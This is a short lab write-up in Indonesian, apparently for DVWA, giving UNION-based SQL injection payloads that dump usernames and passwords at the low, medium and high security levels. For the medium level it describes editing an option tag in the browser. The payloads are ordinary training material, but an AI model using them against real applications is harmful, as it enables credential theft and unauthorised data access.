# SQL Injection
SQL Injection (SQLi) adalah celah keamanan web yang memungkinkan penyerang mengintruksi query yang dibuat aplikasi untuk melihat data yang biasanya tidak dapat mereka ambil, misalnya data pengguna lain atau data lain apapun yang dapat diakses oleh aplikasi itu sendiri

## Security Low
Tambahkan spasi setelah **--**
```sh
a' UNION SELECT user, password FROM users -- 
```

```sh
q' UNION SELECT user, password FROM users #
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/sql%20injection/sqli%201.JPG)

## Security Medium
Lakukan injeksi pada tag `<option>` menggunakan inspect element di browser
```sh
1 or 1=1 UNION SELECT user, password FROM users#
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/sql%20injection/sqli%202.JPG)

## Security High
```sh
1' UNION SELECT user, password FROM users#
```
